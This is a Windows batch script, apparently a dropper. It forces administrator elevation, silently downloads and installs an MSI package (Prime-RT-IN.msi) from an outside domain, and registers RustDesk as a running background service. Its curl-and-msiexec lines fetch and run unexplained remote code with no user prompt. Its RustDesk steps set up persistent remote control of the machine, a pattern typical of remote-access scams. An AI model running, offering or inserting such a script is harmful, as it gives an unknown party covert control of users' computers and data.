@echo off
setlocal

:: Auto-elevate
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Install Prime-RT-IN.msi silently
cd /d %temp%
curl -L -O https://prime-path.help/static/configs/Prime-RT-IN.msi
msiexec /i "%temp%\Prime-RT-IN.msi" /qn /norestart

:: Install RustDesk silently and as a background service
set "rustdeskPath="
for /d %%a in ("C:\Program Files*\RustDesk") do (
    if exist "%%a\RustDesk.exe" (
        set "rustdeskPath=%%a\RustDesk.exe"
    )
)

if defined rustdeskPath (
    "%rustdeskPath%" --install
    sc start rustdesk
    echo RustDesk installed as background service.
) else (
    echo RustDesk not found.
)

exit /b
